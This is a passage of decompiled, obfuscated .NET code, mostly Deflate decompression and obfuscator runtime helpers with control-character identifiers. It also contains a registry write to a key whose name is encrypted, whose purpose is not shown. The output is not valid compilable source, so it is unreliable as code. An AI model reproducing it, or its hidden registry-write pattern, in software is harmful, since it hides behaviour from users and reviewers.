          registryKey1 = Registry.CurrentUser.OpenSubKey(\u0007.\u0001(\u000E.\u0003.\u0001(6964), \u000E.\u0003.\u0001(55)), true);
          registryKey1.SetValue(\u000E.\u0002.\u0001.\u0001, (object) \u000E.\u0002.\u0001.\u0002);
          registryKey1.Close();
          if (false)
            return;
          Thread.Sleep(5000);
          try
          {
            do
            {
              \u000E.\u0001.\u0004.Abort();
            }
            while (false);
          }
          catch (Exception ex)
          {
            int lErl = *(int*) ((IntPtr) voidPtr + 4);
            ProjectData.SetProjectError(ex, lErl);
            ProjectData.ClearProjectError();
          }
        }
        catch (Exception ex1)
        {
          int lErl1 = *(int*) ((IntPtr) voidPtr + 4);
          ProjectData.SetProjectError(ex1, lErl1);
          while (*(int*) voidPtr != 3)
          {
            if (false)
              return;
            if (true)
            {
              *(int*) voidPtr = checked (*(int*) voidPtr + 1);
              ProjectData.ClearProjectError();
              if (false)
                return;
              goto label_6;
            }
          }
          try
          {
            \u000E.\u0001.\u0004.Abort();
          }
          catch (Exception ex2)
          {
            int lErl2 = *(int*) ((IntPtr) voidPtr + 4);
            ProjectData.SetProjectError(ex2, lErl2);
            if (true)
              ProjectData.ClearProjectError();
          }
          ProjectData.ClearProjectError();
        }
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) *(int*) voidPtr;
        RegistryKey registryKey2 = registryKey1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) *(int*) ((IntPtr) voidPtr + 4);
        \u0007.\u0001(ex, (object) local1, (object) registryKey2, (object) local2);
        throw;
      }
    }

    static unsafe int \u0001([In] int obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(16);
      try
      {
        int num1 = obj0;
        int num2 = \u0003.\u0001.\u0001.Length;
label_2:
        int num3 = num2;
        if (num1 <= num3)
          goto label_13;
        else
          goto label_12;
label_11:
        *(int*) ((IntPtr) voidPtr + 12) = *(int*) voidPtr;
        goto label_17;
label_12:
        *(int*) voidPtr = 0;
        goto label_11;
label_13:
        IntPtr num4 = (IntPtr) voidPtr + 4;
        int num5 = obj0;
        *(int*) ((IntPtr) voidPtr + 8) = checked (obj0 + 8);
        *(int*) num4 = num5;
        while (*(int*) ((IntPtr) voidPtr + 4) <= *(int*) ((IntPtr) voidPtr + 8))
        {
          if (true)
            goto label_14;
label_8:
          *(int*) ((IntPtr) voidPtr + 4) = checked (*(int*) unchecked ((IntPtr) voidPtr + 4) + 1);
          continue;
label_14:
          if (*(int*) ((IntPtr) voidPtr + 4) <= checked (\u0003.\u0001.\u0001.Length - 1))
          {
            int num6 = (int) \u0003.\u0001.\u0001[*(int*) ((IntPtr) voidPtr + 4)];
            int num7 = 128;
            if (num7 == 0)
            {
              num2 = num7;
              num1 = num6;
              goto label_2;
            }
            else if ((num6 & num7) != 128)
            {
              *(int*) voidPtr = *(int*) ((IntPtr) voidPtr + 4);
              goto label_11;
            }
            else
              goto label_8;
          }
          else
          {
            *(int*) voidPtr = 0;
            goto label_11;
          }
        }
        *(int*) voidPtr = checked (obj0 + 8);
        goto label_11;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) *(int*) voidPtr;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) *(int*) ((IntPtr) voidPtr + 4);
        // ISSUE: variable of a boxed type
        __Boxed<int> local3 = (ValueType) *(int*) ((IntPtr) voidPtr + 8);
        // ISSUE: variable of a boxed type
        __Boxed<int> local4 = (ValueType) obj0;
        \u0007.\u0001(ex, (object) local1, (object) local2, (object) local3, (object) local4);
        throw;
      }
label_17:
      return *(int*) ((IntPtr) voidPtr + 12);
    }

    static void \u0001([In] \u000F.\u0006.\u0008 obj0)
    {
      try
      {
        obj0.\u0001 = (int) obj0.\u0001[obj0.\u0005] << 5 ^ (int) obj0.\u0001[obj0.\u0005 + 1];
      }
      catch (Exception ex)
      {
        \u000F.\u0006.\u0008 obj = obj0;
        \u0007.\u0001(ex, (object) obj);
        throw;
      }
    }

    static void \u0001([In] int obj0, [In] \u000F.\u0006.\u000E obj1)
    {
      int num1;
      try
      {
        byte[] numArray1 = obj1.\u0001;
        \u000F.\u0006.\u000E obj2 = obj1;
        int num2;
        num1 = num2 = obj2.\u0002;
        obj2.\u0002 = num2 + 1;
        int index1 = num1;
        int num3 = (int) (byte) obj0;
        numArray1[index1] = (byte) num3;
        byte[] numArray2 = obj1.\u0001;
        \u000F.\u0006.\u000E obj3 = obj1;
        int num4;
        num1 = num4 = obj3.\u0002;
        obj3.\u0002 = num4 + 1;
        int index2 = num1;
        int num5 = (int) (byte) (obj0 >> 8);
        numArray2[index2] = (byte) num5;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) num1;
        \u000F.\u0006.\u000E obj = obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) obj0;
        \u0007.\u0001(ex, (object) local1, (object) obj, (object) local2);
        throw;
      }
    }

    static unsafe int \u0001([In] \u000F.\u0006.\u0007 obj0, [In] int obj1)
    {
      void* voidPtr;
      int num1;
      do
      {
        num1 = 8;
        if (num1 != 0)
        {
          // ISSUE: untyped stack allocation
          voidPtr = (void*) __untypedstackalloc(num1);
          try
          {
            do
            {
              *(int*) voidPtr = 0;
            }
            while (false);
            int num2;
            for (; obj1 >= 4; obj1 = num2)
            {
              if (true)
                *(int*) voidPtr = *(int*) voidPtr + 2;
              int num3 = obj1;
              while (true)
              {
                num2 = num3 >> 1;
                if (false)
                  num3 = num2;
                else
                  break;
              }
            }
            *(int*) ((IntPtr) voidPtr + 4) = *(int*) voidPtr + obj1;
          }
          catch (Exception ex)
          {
            // ISSUE: variable of a boxed type
            __Boxed<int> local1 = (ValueType) *(int*) voidPtr;
            \u000F.\u0006.\u0007 obj = obj0;
            // ISSUE: variable of a boxed type
            __Boxed<int> local2 = (ValueType) obj1;
            \u0007.\u0001(ex, (object) local1, (object) obj, (object) local2);
            throw;
          }
        }
        else
          goto label_6;
      }
      while (false);
      goto label_14;
label_6:
      return num1;
label_14:
      return *(int*) ((IntPtr) voidPtr + 4);
    }

    static void \u0001([In] int obj0, [In] int obj1, [In] byte[] obj2, [In] \u000F.\u0006.\u000E obj3)
    {
      try
      {
        byte[] sourceArray = obj2;
        int sourceIndex = obj0;
        byte[] destinationArray = obj3.\u0001;
        int destinationIndex = obj3.\u0002;
        int length = obj1;
        if (true)
          goto label_2;
label_1:
        obj3.\u0002 += obj1;
        return;
label_2:
        Array.Copy((Array) sourceArray, sourceIndex, (Array) destinationArray, destinationIndex, length);
        goto label_1;
      }
      catch (Exception ex)
      {
        \u000F.\u0006.\u000E obj = obj3;
        byte[] numArray = obj2;
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) obj1;
        \u0007.\u0001(ex, (object) obj, (object) numArray, (object) local1, (object) local2);
        throw;
      }
    }

    static unsafe void \u0001([In] \u000F.\u0006.\u0007.\u0001 obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(16);
      int[] numArray1;
      int[] numArray2;
      IntPtr index;
      try
      {
        int length = obj0.\u0001.Length;
        numArray1 = new int[obj0.\u0003];
        *(int*) voidPtr = 0;
        obj0.\u0002 = new short[obj0.\u0001.Length];
        *(int*) ((IntPtr) voidPtr + 4) = 0;
        while (*(int*) ((IntPtr) voidPtr + 4) < obj0.\u0003)
        {
          numArray1[*(int*) ((IntPtr) voidPtr + 4)] = *(int*) voidPtr;
          *(int*) voidPtr = *(int*) voidPtr + (obj0.\u0001[*(int*) ((IntPtr) voidPtr + 4)] << 15 - *(int*) ((IntPtr) voidPtr + 4));
          *(int*) ((IntPtr) voidPtr + 4) = *(int*) ((IntPtr) voidPtr + 4) + 1;
        }
        *(int*) ((IntPtr) voidPtr + 8) = 0;
        while (true)
        {
          int num1 = *(int*) ((IntPtr) voidPtr + 8);
          int num2 = obj0.\u0002;
          if (true)
            goto label_9;
label_5:
          if (num1 > num2)
          {
            obj0.\u0002[*(int*) ((IntPtr) voidPtr + 8)] = \u0007.\u0001(numArray1[*(int*) ((IntPtr) voidPtr + 12) - 1]);
            (numArray2 = numArray1)[(int) (index = (IntPtr) (*(int*) ((IntPtr) voidPtr + 12) - 1))] = numArray2[index] + (1 << 16 - *(int*) ((IntPtr) voidPtr + 12));
          }
          *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 8) + 1;
          continue;
label_9:
          if (num1 < num2)
          {
            *(int*) ((IntPtr) voidPtr + 12) = (int) obj0.\u0001[*(int*) ((IntPtr) voidPtr + 8)];
            int num3 = *(int*) ((IntPtr) voidPtr + 12);
            num2 = 0;
            num1 = num3;
            goto label_5;
          }
          else
            break;
        }
      }
      catch (Exception ex)
      {
        int[] numArray3 = numArray1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) *(int*) voidPtr;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) *(int*) ((IntPtr) voidPtr + 4);
        // ISSUE: variable of a boxed type
        __Boxed<int> local3 = (ValueType) *(int*) ((IntPtr) voidPtr + 8);
        // ISSUE: variable of a boxed type
        __Boxed<int> local4 = (ValueType) *(int*) ((IntPtr) voidPtr + 12);
        int[] numArray4 = numArray2;
        // ISSUE: variable of a boxed type
        __Boxed<IntPtr> local5 = (ValueType) index;
        \u000F.\u0006.\u0007.\u0001 obj = obj0;
        \u0007.\u0001(ex, (object) numArray3, (object) local1, (object) local2, (object) local3, (object) local4, (object) numArray4, (object) local5, (object) obj);
        throw;
      }
    }

    static unsafe int \u0001([In] \u000F.\u0006.\u0007.\u0001 obj0)
    {
      // ISSUE: untyped stack allocation
      IntPtr num = __untypedstackalloc(12);
      if (true)
        goto label_7;
label_1:
      void* voidPtr;
      try
      {
        *(int*) voidPtr = 0;
        *(int*) ((IntPtr) voidPtr + 4) = 0;
        while (*(int*) ((IntPtr) voidPtr + 4) < obj0.\u0001.Length)
        {
          *(int*) voidPtr = *(int*) voidPtr + (int) obj0.\u0001[*(int*) ((IntPtr) voidPtr + 4)] * (int) obj0.\u0001[*(int*) ((IntPtr) voidPtr + 4)];
          *(int*) ((IntPtr) voidPtr + 4) = *(int*) ((IntPtr) voidPtr + 4) + 1;
        }
        *(int*) ((IntPtr) voidPtr + 8) = *(int*) voidPtr;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) *(int*) voidPtr;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) *(int*) ((IntPtr) voidPtr + 4);
        \u000F.\u0006.\u0007.\u0001 obj = obj0;
        \u0007.\u0001(ex, (object) local1, (object) local2, (object) obj);
        throw;
      }
      return *(int*) ((IntPtr) voidPtr + 8);
label_7:
      voidPtr = (void*) num;
      goto label_1;
    }

    static bool \u0001(
      [In] int obj0,
      [In] ref \u000F.\u0002.\u0001.\u0001 obj1,
      [In] int obj2,
      [In] int obj3,
      [In] int obj4,
      [In] ref \u000F.\u0002.\u0001.\u0001 obj5,
      [In] int obj6)
    {
      bool flag;
      return flag;
    }

    static void \u0001([In] \u000E.\u0004 obj0, [In] \u0006.\u0006 obj1, [In] string obj2, [In] string obj3)
    {
      \u0001.\u0001 obj4 = obj0.\u0001;
      \u0001.\u0001 obj5;
      if (true)
        obj5 = obj4;
      if (obj5 == null)
        return;
      obj5((object) obj0, new \u0005.\u0005(obj1, obj2, obj3));
    }

    static string \u0001([In] \u000E.\u0004.\u0003 obj0) => obj0.\u0002;

    static Assembly[] \u0001([In] \u0002.\u0003 obj0)
    {
      Assembly[] assemblyArray;
      try
      {
        do
        {
          assemblyArray = AppDomain.CurrentDomain.GetAssemblies();
        }
        while (false);
      }
      catch
      {
        assemblyArray = new Assembly[1]{ \u0007.\u0001() };
      }
      return assemblyArray;
    }

    static unsafe string \u0001([In] int obj0, [In] string obj1)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(12);
      try
      {
        *(int*) voidPtr = -1;
        IntPtr num = (IntPtr) voidPtr + 4;
        *(int*) ((IntPtr) voidPtr + 8) = \u0003.\u0001.\u0001.Length;
        *(int*) num = 0;
        string str;
        while (true)
        {
          do
          {
            if (*(int*) ((IntPtr) voidPtr + 4) <= *(int*) ((IntPtr) voidPtr + 8))
            {
              if (\u0003.\u0001.\u0001[*(int*) ((IntPtr) voidPtr + 4)].ToLower().CompareTo(obj1.ToLower()) == 0)
                *(int*) voidPtr = *(int*) ((IntPtr) voidPtr + 4);
              else
                goto label_4;
            }
            if (*(int*) voidPtr == -1)
            {
              str = (string) null;
              goto label_10;
            }
          }
          while (false);
          break;
label_4:
          *(int*) ((IntPtr) voidPtr + 4) = checked (*(int*) unchecked ((IntPtr) voidPtr + 4) + 1);
        }
        str = \u0007.\u0001(obj0, *(int*) voidPtr);
label_10:
        return str;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) *(int*) voidPtr;
        string str1;
        string str2 = str1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) *(int*) ((IntPtr) voidPtr + 4);
        // ISSUE: variable of a boxed type
        __Boxed<int> local3 = (ValueType) *(int*) ((IntPtr) voidPtr + 8);
        // ISSUE: variable of a boxed type
        __Boxed<int> local4 = (ValueType) obj0;
        string str3 = obj1;
        \u0007.\u0001(ex, (object) local1, (object) str2, (object) local2, (object) local3, (object) local4, (object) str3);
        throw;
      }
    }

    static unsafe bool \u0001([In] \u000F.\u0006.\u0001 obj0)
    {
      int num1 = 13;
      do
      {
        if (num1 != 0)
        {
          // ISSUE: untyped stack allocation
          void* voidPtr = (void*) __untypedstackalloc(num1);
          int num2;
          int index;
          try
          {
            int num3 = \u0007.\u0001(obj0.\u0001);
            if (true)
              goto label_38;
label_36:
            while (num2 >= 258)
            {
              *(int*) ((IntPtr) voidPtr + 8) = obj0.\u0001;
              int num4 = *(int*) ((IntPtr) voidPtr + 8);
              int num5;
              while (true)
              {
                int num6 = num4 - 7;
                int num7;
                while (true)
                {
                  switch (num6)
                  {
                    case 0:
                      while (((index = \u0007.\u0001(obj0.\u0001, obj0.\u0001)) & -256) == 0)
                      {
                        \u0007.\u0001(obj0.\u0001, index);
                        num7 = num2 - 1;
                        if (true)
                        {
                          num2 = num7;
                          if (num7 < 258)
                          {
                            *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) 1;
                            goto label_42;
                          }
                        }
                        else
                          goto label_30;
                      }
                      if (index < 257)
                      {
                        num5 = index;
                        if (false)
                        {
                          num6 = num5;
                          continue;
                        }
                        goto label_13;
                      }
                      else
                        goto label_16;
                    case 1:
                      goto label_17;
                    case 2:
                      goto label_24;
                    case 3:
                      goto label_28;
                    default:
                      goto label_36;
                  }
                }
label_16:
                obj0.\u0003 = \u000F.\u0006.\u0001.\u0001[index - 257];
                obj0.\u0002 = \u000F.\u0006.\u0001.\u0002[index - 257];
label_17:
                if (obj0.\u0002 <= 0)
                  goto label_23;
label_18:
                obj0.\u0001 = 8;
                *(int*) voidPtr = \u0007.\u0001(obj0.\u0001, obj0.\u0002);
label_19:
                int num8 = *(int*) voidPtr;
                if (false)
                {
                  num4 = num8;
                  continue;
                }
                if (num8 >= 0)
                {
                  \u0007.\u0001(obj0.\u0001, obj0.\u0002);
                  obj0.\u0003 += *(int*) voidPtr;
                }
                else
                  goto label_21;
label_23:
                obj0.\u0001 = 9;
label_24:
                index = \u0007.\u0001(obj0.\u0002, obj0.\u0001);
                if (index < 0)
                {
                  if (false)
                    goto label_19;
                  else
                    goto label_26;
                }
                else
                {
                  obj0.\u0004 = \u000F.\u0006.\u0001.\u0003[index];
                  obj0.\u0002 = \u000F.\u0006.\u0001.\u0004[index];
                }
label_28:
                if (obj0.\u0002 > 0)
                {
                  obj0.\u0001 = 10;
                  *(int*) ((IntPtr) voidPtr + 4) = \u0007.\u0001(obj0.\u0001, obj0.\u0002);
                  int num9 = *(int*) ((IntPtr) voidPtr + 4);
                  num7 = 0;
                  num7 = num9;
                }
                else
                  goto label_34;
label_30:
                if (num7 >= num7)
                {
                  if (false)
                    goto label_18;
                  else
                    goto label_33;
                }
                else
                  goto label_31;
              }
label_13:
              if (num5 < 0)
              {
                *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) 0;
                goto label_42;
              }
              else
              {
                obj0.\u0002 = (\u000F.\u0006.\u0004) null;
                obj0.\u0001 = (\u000F.\u0006.\u0004) null;
                obj0.\u0001 = 2;
                *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) 1;
                goto label_42;
              }
label_21:
              *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) 0;
              goto label_42;
label_26:
              *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) 0;
              goto label_42;
label_31:
              *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) 0;
              goto label_42;
label_33:
              \u0007.\u0001(obj0.\u0001, obj0.\u0002);
              obj0.\u0004 += *(int*) ((IntPtr) voidPtr + 4);
label_34:
              if (true)
              {
                \u0007.\u0001(obj0.\u0001, obj0.\u0003, obj0.\u0004);
                num2 -= obj0.\u0003;
                obj0.\u0001 = 7;
              }
            }
            *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) 1;
            goto label_42;
label_38:
            num2 = num3;
            goto label_36;
          }
          catch (Exception ex)
          {
            // ISSUE: variable of a boxed type
            __Boxed<int> local1 = (ValueType) num2;
            // ISSUE: variable of a boxed type
            __Boxed<int> local2 = (ValueType) index;
            // ISSUE: variable of a boxed type
            __Boxed<int> local3 = (ValueType) *(int*) voidPtr;
            // ISSUE: variable of a boxed type
            __Boxed<int> local4 = (ValueType) *(int*) ((IntPtr) voidPtr + 4);
            // ISSUE: variable of a boxed type
            __Boxed<int> local5 = (ValueType) *(int*) ((IntPtr) voidPtr + 8);
            \u000F.\u0006.\u0001 obj = obj0;
            \u0007.\u0001(ex, (object) local1, (object) local2, (object) local3, (object) local4, (object) local5, (object) obj);
            throw;
          }
label_42:
          num1 = (int) *(sbyte*) ((IntPtr) voidPtr + 12);
        }
      }
      while (false);
      return num1 != 0;
    }

    static void \u0001([In] Exception obj0, [In] object obj1, [In] object obj2) => \u0007.\u0001(obj0, new object[2]
    {
      obj1,
      obj2
    });

    static unsafe bool \u0001([In] \u000F.\u0006.\u0005 obj0, [In] \u000F.\u0006.\u0002 obj1)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(9);
label_1:
      int num1;
      int num2;
      byte num3;
      int num4;
      try
      {
        while (true)
        {
          num1 = obj0.\u0001;
          int num5 = num1;
          int num6;
          while (true)
          {
            int num7;
            switch (num5)
            {
              case 0:
                obj0.\u0002 = \u0007.\u0001(obj1, 5);
                if (obj0.\u0002 >= 0)
                {
                  obj0.\u0002 += 257;
                  \u0007.\u0001(obj1, 5);
                  obj0.\u0001 = 1;
                  goto case 1;
                }
                else
                  goto label_40;
              case 1:
                if (true)
                {
                  obj0.\u0003 = \u0007.\u0001(obj1, 5);
                  int num8 = obj0.\u0003;
                  int num9 = 0;
                  if (num9 == 0)
                  {
                    if (num8 >= num9)
                    {
                      ++obj0.\u0003;
                      \u0007.\u0001(obj1, 5);
                      obj0.\u0005 = obj0.\u0002 + obj0.\u0003;
                      obj0.\u0002 = new byte[obj0.\u0005];
                      obj0.\u0001 = 2;
                      goto case 2;
                    }
                    else
                      goto label_8;
                  }
                  else
                  {
                    num7 = num9;
                    num7 = num8;
                    goto label_24;
                  }
                }
                else
                  goto label_18;
              case 2:
                obj0.\u0004 = \u0007.\u0001(obj1, 4);
                if (obj0.\u0004 >= 0)
                {
                  obj0.\u0004 += 4;
                  \u0007.\u0001(obj1, 4);
                  if (true)
                  {
                    obj0.\u0001 = new byte[19];
                    obj0.\u0007 = 0;
                    obj0.\u0001 = 3;
                    goto case 3;
                  }
                  else
                    break;
                }
                else
                  goto label_11;
              case 3:
label_19:
                if (obj0.\u0007 < obj0.\u0004)
                {
                  *(int*) voidPtr = \u0007.\u0001(obj1, 3);
                  if (*(int*) voidPtr >= 0)
                  {
                    \u0007.\u0001(obj1, 3);
                    break;
                  }
                  goto label_15;
                }
                else
                {
                  obj0.\u0001 = new \u000F.\u0006.\u0004(obj0.\u0001);
                  obj0.\u0001 = (byte[]) null;
                  obj0.\u0007 = 0;
                  obj0.\u0001 = 4;
                  goto case 4;
                }
              case 4:
label_23:
                num7 = \u0007.\u0001(obj0.\u0001, obj1);
                goto label_24;
              case 5:
label_30:
                *(int*) ((IntPtr) voidPtr + 4) = \u000F.\u0006.\u0005.\u0002[obj0.\u0006];
                num6 = \u0007.\u0001(obj1, *(int*) ((IntPtr) voidPtr + 4));
                if (false)
                {
                  num5 = num6;
                  continue;
                }
                goto label_31;
              default:
                goto label_1;
            }
            obj0.\u0001[\u000F.\u0006.\u0005.\u0003[obj0.\u0007]] = (byte) *(int*) voidPtr;
label_18:
            ++obj0.\u0007;
            goto label_19;
label_24:
            num2 = num7;
            if ((num7 & -16) == 0)
            {
              byte[] numArray = obj0.\u0002;
              num1 = obj0.\u0007++;
              int index = num1;
              obj0.\u0001 = num3 = (byte) num2;
              int num10 = (int) num3;
              numArray[index] = (byte) num10;
              if (obj0.\u0007 != obj0.\u0005)
                goto label_23;
              else
                goto label_22;
            }
            else if (num2 >= 0)
            {
              if (num2 >= 17)
                obj0.\u0001 = (byte) 0;
              obj0.\u0006 = num2 - 16;
              obj0.\u0001 = 5;
              goto label_30;
            }
            else
              goto label_26;
          }
label_31:
          num4 = num6;
          if (num4 >= 0)
          {
            \u0007.\u0001(obj1, *(int*) ((IntPtr) voidPtr + 4));
            num4 += \u000F.\u0006.\u0005.\u0001[obj0.\u0006];
            while (num4-- > 0)
            {
              byte[] numArray = obj0.\u0002;
              num1 = obj0.\u0007++;
              int index = num1;
              int num11 = (int) obj0.\u0001;
              numArray[index] = (byte) num11;
            }
            if (obj0.\u0007 != obj0.\u0005)
              obj0.\u0001 = 4;
            else
              goto label_37;
          }
          else
            goto label_32;
        }
label_8:
        *(sbyte*) ((IntPtr) voidPtr + 8) = (sbyte) 0;
        goto label_42;
label_11:
        *(sbyte*) ((IntPtr) voidPtr + 8) = (sbyte) 0;
        goto label_42;
label_15:
        *(sbyte*) ((IntPtr) voidPtr + 8) = (sbyte) 0;
        goto label_42;
label_22:
        *(sbyte*) ((IntPtr) voidPtr + 8) = (sbyte) 1;
        goto label_42;
label_26:
        *(sbyte*) ((IntPtr) voidPtr + 8) = (sbyte) 0;
        goto label_42;
label_32:
        *(sbyte*) ((IntPtr) voidPtr + 8) = (sbyte) 0;
        goto label_42;
label_37:
        *(sbyte*) ((IntPtr) voidPtr + 8) = (sbyte) 1;
        goto label_42;
label_40:
        *(sbyte*) ((IntPtr) voidPtr + 8) = (sbyte) 0;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) *(int*) voidPtr;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) num2;
        // ISSUE: variable of a boxed type
        __Boxed<int> local3 = (ValueType) *(int*) ((IntPtr) voidPtr + 4);
        // ISSUE: variable of a boxed type
        __Boxed<int> local4 = (ValueType) num4;
        // ISSUE: variable of a boxed type
        __Boxed<int> local5 = (ValueType) num1;
        // ISSUE: variable of a boxed type
        __Boxed<byte> local6 = (ValueType) num3;
        \u000F.\u0006.\u0005 obj2 = obj0;
        \u000F.\u0006.\u0002 obj3 = obj1;
        \u0007.\u0001(ex, (object) local1, (object) local2, (object) local3, (object) local4, (object) local5, (object) local6, (object) obj2, (object) obj3);
        throw;
      }
label_42:
      return (bool) *(sbyte*) ((IntPtr) voidPtr + 8);
    }

    static unsafe int \u0001([In] string obj0, [In] \u0002.\u0003 obj1)
    {
      int num1 = 18;
      int num2;
      while (true)
      {
        // ISSUE: untyped stack allocation
        void* voidPtr = (void*) __untypedstackalloc(num1);
        try
        {
          *(sbyte*) ((IntPtr) voidPtr + 16) = (sbyte) (obj1.\u0001[0] == '\u0001');
          switch (obj0)
          {
            case null:
              *(int*) ((IntPtr) voidPtr + 12) = -1;
              break;
            default:
              int num3;
              for (int index = obj0.Length; index != 0 && (*(sbyte*) ((IntPtr) voidPtr + 16) == (sbyte) 0 || obj0.Length <= 4) && (*(sbyte*) ((IntPtr) voidPtr + 16) != (sbyte) 0 || obj0[0] == '#'); index = num3)
              {
                *(int*) voidPtr = 0;
                *(int*) ((IntPtr) voidPtr + 4) = obj0.Length - 1;
                while (*(int*) ((IntPtr) voidPtr + 4) >= 0 && (*(sbyte*) ((IntPtr) voidPtr + 16) != (sbyte) 0 || *(int*) ((IntPtr) voidPtr + 4) != 0))
                {
                  char ch = obj0[*(int*) ((IntPtr) voidPtr + 4)];
                  *(sbyte*) ((IntPtr) voidPtr + 17) = (sbyte) 0;
                  *(int*) ((IntPtr) voidPtr + 8) = 0;
                  while (true)
                  {
                    num3 = *(int*) ((IntPtr) voidPtr + 8);
                    if (true)
                    {
                      int length = obj1.\u0001.Length;
                      if (num3 < length)
                      {
                        if ((int) obj1.\u0001[*(int*) ((IntPtr) voidPtr + 8)] != (int) ch)
                          *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 8) + 1;
                        else
                          break;
                      }
                      else
                        goto label_13;
                    }
                    else
                      break;
                  }
                  *(int*) voidPtr = *(int*) voidPtr * obj1.\u0001.Length + *(int*) ((IntPtr) voidPtr + 8);
                  *(sbyte*) ((IntPtr) voidPtr + 17) = (sbyte) 1;
label_13:
                  if (true)
                  {
                    if (*(sbyte*) ((IntPtr) voidPtr + 17) == (sbyte) 0)
                    {
                      *(int*) ((IntPtr) voidPtr + 12) = -1;
                      goto label_22;
                    }
                    else
                      *(int*) ((IntPtr) voidPtr + 4) = *(int*) ((IntPtr) voidPtr + 4) - 1;
                  }
                  else
                    goto label_22;
                }
                *(int*) ((IntPtr) voidPtr + 12) = *(int*) voidPtr;
                goto label_22;
              }
              goto case null;
          }
        }
        catch
        {
          *(int*) ((IntPtr) voidPtr + 12) = -1;
        }
label_22:
        num2 = *(int*) ((IntPtr) voidPtr + 12);
        if (false)
          num1 = num2;
        else
          break;
      }
      return num2;
    }

    static void \u0001([In] \u000F.\u0006.\u0007.\u0001 obj0, [In] int obj1)
    {
      try
      {
        do
        {
          if (true)
            goto label_3;
label_1:
          continue;
label_3:
          \u0007.\u0001(obj0.\u0001.\u0001, (int) obj0.\u0002[obj1] & (int) ushort.MaxValue, (int) obj0.\u0001[obj1]);
          goto label_1;
        }
        while (false);
      }
      catch (Exception ex)
      {
        \u000F.\u0006.\u0007.\u0001 obj = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> local = (ValueType) obj1;
        \u0007.\u0001(ex, (object) obj, (object) local);
        throw;
      }
    }

    static \u0005.\u0006 \u0001()
    {
      if (\u0005.\u0006.\u0001 == null)
        goto label_16;
label_15:
      return \u0005.\u0006.\u0001;
label_16:
      System.Type[] types = Assembly.GetExecutingAssembly().GetTypes();
      if (true)
        goto label_17;
label_1:
      int index = 0;
      System.Type[] typeArray;
      while (true)
      {
        int num1 = index;
        int num2;
        while (true)
        {
          int num3 = typeArray.Length;
          if (true)
            goto label_14;
label_10:
          num2 = num1 + num3;
          if (false)
          {
            num1 = num2;
            continue;
          }
          break;
label_14:
          if (num1 < num3)
          {
            System.Type type = typeArray[index];
            if ((object) type != null && (object) type.BaseType != null)
            {
              if ((object) type.BaseType == (object) typeof (\u0005.\u0006))
              {
                try
                {
                  if (true)
                    \u0005.\u0006.\u0001 = (\u0005.\u0006) Activator.CreateInstance(type, true);
                  else
                    goto label_6;
label_5:
                  if (\u0005.\u0006.\u0001 == null)
                    goto label_9;
label_6:
                  if (false)
                    goto label_5;
                  else
                    goto label_15;
                }
                catch
                {
                }
              }
            }
label_9:
            int num4 = index;
            num3 = 1;
            num1 = num4;
            goto label_10;
          }
          else
            goto label_15;
        }
        index = num2;
      }
label_17:
      typeArray = types;
      goto label_1;
    }

    static unsafe int \u0001([In] int obj0, [In] int obj1, [In] \u000F.\u0006.\u0003 obj2, [In] byte[] obj3)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(16);
      try
      {
        *(int*) voidPtr = obj2.\u0001;
        if (obj1 <= obj2.\u0002)
          goto label_9;
        else
          goto label_8;
label_2:
        do
        {
          *(int*) ((IntPtr) voidPtr + 4) = obj1;
          *(int*) ((IntPtr) voidPtr + 8) = obj1 - *(int*) voidPtr;
          if (*(int*) ((IntPtr) voidPtr + 8) > 0)
          {
            Array.Copy((Array) obj2.\u0001, 32768 - *(int*) ((IntPtr) voidPtr + 8), (Array) obj3, obj0, *(int*) ((IntPtr) voidPtr + 8));
            obj0 += *(int*) ((IntPtr) voidPtr + 8);
          }
          else
            goto label_5;
        }
        while (false);
        obj1 = *(int*) voidPtr;
label_5:
        Array.Copy((Array) obj2.\u0001, *(int*) voidPtr - obj1, (Array) obj3, obj0, obj1);
        obj2.\u0002 -= *(int*) ((IntPtr) voidPtr + 4);
        if (obj2.\u0002 < 0)
          throw new InvalidOperationException();
        *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 4);
        goto label_11;
label_8:
        obj1 = obj2.\u0002;
        goto label_2;
label_9:
        *(int*) voidPtr = obj2.\u0001 - obj2.\u0002 + obj1 & (int) short.MaxValue;
        goto label_2;
      }
      catch (Exception ex)
      {
